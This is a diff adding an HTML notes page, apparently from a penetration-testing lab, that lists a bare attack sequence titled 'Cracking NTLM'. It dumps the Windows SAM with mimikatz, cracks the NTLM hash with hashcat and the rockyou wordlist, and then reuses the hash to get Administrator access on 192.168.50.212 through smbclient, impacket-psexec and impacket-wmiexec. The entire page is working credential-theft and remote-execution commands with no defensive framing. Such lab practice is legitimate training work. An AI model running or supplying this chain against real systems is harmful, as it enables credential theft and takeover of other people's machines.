@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Cracking NTLM</title>
+</head><body>Get-LocalUser {to see users in windows}<br/>
+<br/>
+cd C:\tools<br/>
+<br/>
+.\mimikatz.exe<br/>
+<br/>
+privilege::debug<br/>
+<br/>
+token::elevate<br/>
+<br/>
+lsadump::sam<br/>
+<br/>
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force<br/>
+<br/>
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b<br/>
+<br/>
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212<br/>
+<br/>
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</body></html>
